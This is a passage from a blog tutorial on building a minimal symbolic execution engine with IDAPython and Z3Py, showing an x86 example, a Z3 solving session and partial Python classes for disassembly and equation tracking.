<li>the instruction aren&rsquo;t playing with the <a href="https://en.wikipedia.org/wiki/FLAGS_register">EFLAGS</a> register.</li>
<li>the instruction only used 32 bits registers (not 16 bits, or 8 bits).</li>
<li>the number of unique instruction is really small: <em>mov</em>, <em>shr</em>, <em>shl</em>, <em>xor</em>, <em>and</em>, <em>xor</em>, <em>add</em>.</li>
<li>the instructions used are easy to emulate.</li>
</ul>


<p>Understand that here, we are really in a specific case, the engine wouldn&rsquo;t be that easy to implement to cover the most used x86 instructions ; but we are lucky, we won&rsquo;t need that!</p>

<p>The engine is in fact a pseudo-emulator that propagates the different actions done by the asm instructions. Here is how our engine works:</p>

<ol>
<li>Each time a symbolic variable is found, you instantiate a Z3 BitVector and you keep it somewhere. A symbolic variable is basically a variable that the attacker can control. For example, in our case, we will have two symbolic variables: the two arguments passed to the function. We will see later an easy heuristic to find &ldquo;automatically&rdquo; the symbolic variables in our case.</li>
<li>When you have an instruction, you emulate it and you update the CPU state of the engine. If it involves an equation, you update your set of equations.</li>
<li>You do that until the end of the routine.</li>
</ol>


<p>Of course, when the engine has been successfully executed, you may want to ask it some questions like &ldquo;what does hold the EAX register at the end of the routine?&rdquo;. You want to have exactly all the operations needed to compute EAX. In our case, we hope to obtain &ldquo;<em>symbolic_variable1</em> + <em>symbolic_variable2</em>&rdquo;.</p>

<p>Here is a little example to sum up what we just said:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nv">arg1</span><span class="p">]</span>  <span class="c1">; at this moment we have our first symbolic variable</span>
</span><span class='line'>                 <span class="c1">; we push it in our equations list</span>
</span><span class='line'><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nv">arg2</span><span class="p">]</span>  <span class="c1">; same thing here</span>
</span><span class='line'>
</span><span class='line'><span class="nf">shr</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>   <span class="c1">; EAX=sym1 &gt;&gt; 2</span>
</span><span class='line'><span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>   <span class="c1">; EAX=(sym1 &gt;&gt; 2) + 1</span>
</span><span class='line'><span class="nf">shl</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">3</span>   <span class="c1">; EAX=((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1</span>
</span><span class='line'><span class="nf">and</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>   <span class="c1">; EAX=(((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2</span>
</span><span class='line'><span class="nf">inc</span> <span class="nb">edx</span>      <span class="c1">; EDX=sym2 + 1</span>
</span><span class='line'><span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span> <span class="c1">; EDX=(sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2)</span>
</span><span class='line'><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span> <span class="c1">; EAX=(sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So at the end, you can ask the engine to give you the final state of EAX for example and it should give you something like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>EAX=(sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2)
</span></code></pre></td></tr></table></div></figure>


<p>With that equation you are free to use Z3Py to either simplify it or to try to find how you can have a specific value in EAX controlling only the symbolic variables:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [1]: from z3 import *
</span><span class='line'>In [2]: sym1 = BitVec(&#39;sym1&#39;, 32)
</span><span class='line'>In [3]: sym2 = BitVec(&#39;sym2&#39;, 32)
</span><span class='line'>
</span><span class='line'>In [4]: simplify((sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2))
</span><span class='line'>Out[4]: 1 + sym2 ^ Concat(0, 1 + Extract(0, 0, sym1 &gt;&gt; 2), 0)
</span><span class='line'>
</span><span class='line'>In [5]: solve((sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2) == 0xdeadbeef)
</span><span class='line'>[sym1 = 0, sym2 = 3735928556]
</span><span class='line'>
</span><span class='line'>In [6]: solve((sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2) == 0xdeadbeef, sym1 !=  0)
</span><span class='line'>[sym1 = 1073741824, sym2 = 3735928556]
</span><span class='line'>
</span><span class='line'>In [7]: sym1 = 1073741824
</span><span class='line'>In [8]: sym2 = 3735928556
</span><span class='line'>
</span><span class='line'>In [9]: hex((sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2) &amp; 0xffffffff)
</span><span class='line'>Out[9]: &#39;0xdeadbeefL&#39;
</span></code></pre></td></tr></table></div></figure>


<p>As you can imagine, that kind of tool is very valuable/handy when you do reverse-engineering tasks or bug-hunting. Unfortunately, our PoC won&rsquo;t be enough accurate/generic/complete to be used in &ldquo;normal&rdquo; cases, but never mind.</p>

<h1>Let&rsquo;s code</h1>

<p>To implement our little PoC we will use only <a href="https://code.google.com/p/idapython/">IDAPython</a> and <a href="http://rise4fun.com/z3py/">Z3Py</a>.</p>

<h2>The disassembler</h2>

<p>The first thing we have to do is to use IDA&rsquo;s API in order to have some inspection information about assembly instructions. The idea is just to have the mnemonic, the source and the destination operands easily ; here is the class I&rsquo;ve designed toward that purpose:</p>

<figure class='code'><figcaption><span>Disassembler class</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">Disassembler</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;A simple class to decode easily instruction in IDA&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">end</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_decode_instr</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;Returns mnemonic, dst, src&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="n">mnem</span> <span class="o">=</span> <span class="n">GetMnem</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>            <span class="n">ty</span> <span class="o">=</span> <span class="n">GetOpType</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>            <span class="c"># cst</span>
</span><span class='line'>            <span class="k">if</span> <span class="mi">5</span> <span class="o">&lt;=</span> <span class="n">ty</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">GetOperandValue</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">GetOpnd</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="p">[</span><span class="n">mnem</span><span class="p">]</span> <span class="o">+</span> <span class="n">x</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_next_instruction</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;This is a convenient generator, you can iterator through</span>
</span><span class='line'><span class="sd">        each instructions easily&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">!=</span> <span class="bp">self</span><span class="o">.</span><span class="n">end</span><span class="p">:</span>
</span><span class='line'>            <span class="k">yield</span> <span class="bp">self</span><span class="o">.</span><span class="n">_decode_instr</span><span class="p">()</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">+=</span> <span class="n">ItemSize</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>The symbolic execution engine</h2>

<p>There are several important parts in our engine:</p>

<ol>
<li>the part which &ldquo;emulates&rdquo; the assembly instruction.</li>
<li>the part which stores the different equations used through the routine. It is a simple Python dictionary: the key is a unique identifier, and the value is the equation</li>
<li>the CPU state. We also use a dictionary for that purpose: the key will be the register names, and the value will be what the register holds at that specific moment. Note we will only store the unique identifier of the equation. In fact, our design is really similar to Jonathan&rsquo;s one in &ldquo;<a href="http://shell-storm.org/blog/Binary-analysis-Concolic-execution-with-Pin-and-z3/">Binary analysis: Concolic execution with Pin and z3</a>&rdquo;, so please refer you to his cool pictures if it&rsquo;s not really clear :P.</li>
<li>the memory state ; in that dictionary we store memory references. Remember, if we find a non-initialized access to a memory area we instantiate a symbolic variable. That is our heuristic to find the symbolic variables automatically.</li>
</ol>


<p>Here is the PoC code:</p>

<figure class='code'><figcaption><span>SymbolicExecutionEngine class</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">prove</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Taken from http://rise4fun.com/Z3Py/tutorialcontent/guide#h26&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Not</span><span class="p">(</span><span class="n">f</span><span class="p">))</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">unsat</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>    <span class="k">return</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">SymbolicExecutionEngine</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;The symbolic execution engine is the class that will</span>
</span><span class='line'><span class="sd">    handle the symbolic execution. It will keep a track of the </span>
</span><span class='line'><span class="sd">    different equations encountered, and the CPU context at each point of the program.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The symbolic variables have to be found by the user (or using data-taing). This is not</span>
</span><span class='line'><span class="sd">    the purpose of this class.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    We are lucky, we only need to handle those operations &amp; encodings:</span>
</span><span class='line'><span class="sd">        . mov:</span>
</span><span class='line'><span class="sd">            . mov reg32, reg32</span>
</span><span class='line'><span class="sd">            . mov reg32, [mem]</span>
</span><span class='line'><span class="sd">            . mov [mem], reg32</span>
</span><span class='line'><span class="sd">        . shr:</span>
</span><span class='line'><span class="sd">            . shr reg32, cst</span>
</span><span class='line'><span class="sd">        . shl:</span>
</span><span class='line'><span class="sd">            . shl reg32, cst</span>
</span><span class='line'><span class="sd">        . and:</span>
</span><span class='line'><span class="sd">            . and reg32, cst</span>
</span><span class='line'><span class="sd">            . and reg32, reg32</span>
</span><span class='line'><span class="sd">        . xor:</span>
</span><span class='line'><span class="sd">            . xor reg32, cst</span>
</span><span class='line'><span class="sd">        . or:</span>
</span><span class='line'><span class="sd">            . or reg32, reg32</span>
</span><span class='line'><span class="sd">        . add:</span>
</span><span class='line'><span class="sd">            . add reg32, reg32</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    We also don&#39;t care about:</span>
</span><span class='line'><span class="sd">        . EFLAGS</span>
</span><span class='line'><span class="sd">        . branches</span>
</span><span class='line'><span class="sd">        . smaller registers (16/8 bits)</span>
</span><span class='line'><span class="sd">    Long story short: it&#39;s perfect ; that environment makes really easy to play with symbolic execution.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
</span><span class='line'>        <span class="c"># This is the CPU context at each time</span>
</span><span class='line'>        <span class="c"># The value of the registers are index in the equations dictionnary</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>            <span class="s">&#39;eax&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ebx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ecx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;edx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;esi&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;edi&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ebp&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;esp&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;eip&#39;</span> <span class="p">:</span> <span class="bp">None</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The address where the symbolic execution will start</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The address where the symbolic execution will stop</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Our disassembler</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">disass</span> <span class="o">=</span> <span class="n">Disassembler</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># This is the memory that can be used by the instructions to save temporary values/results</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Each equation must have a unique id</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The symbolic variables will be stored there</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Each equation will be stored here</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">equations</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_check_if_reg32</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;XXX: make a decorator?&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_push_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">set_reg_with_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_check_if_reg32</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_push_equation</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_reg_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_check_if_reg32</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]]</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;Run from start address to end address the engine&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">mnemonic</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">disass</span><span class="o">.</span><span class="n">get_next_instruction</span><span class="p">():</span>
</span><span class='line'>            <span class="k">if</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;mov&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># mov reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="c"># mov reg32, [mem]</span>
</span><span class='line'>                <span class="k">elif</span> <span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;var_&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;arg&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">if</span> <span class="n">src</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">:</span>
</span><span class='line'>                        <span class="c"># A non-initialized location is trying to be read, we got a symbolic variable!</span>
</span><span class='line'>                        <span class="n">sym</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;arg</span><span class="si">%d</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">),</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span><span class='line'>                        <span class="k">print</span> <span class="s">&#39;Trying to read a non-initialized area, we got a new symbolic variable: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">sym</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_push_equation</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="c"># mov [mem], reg32</span>
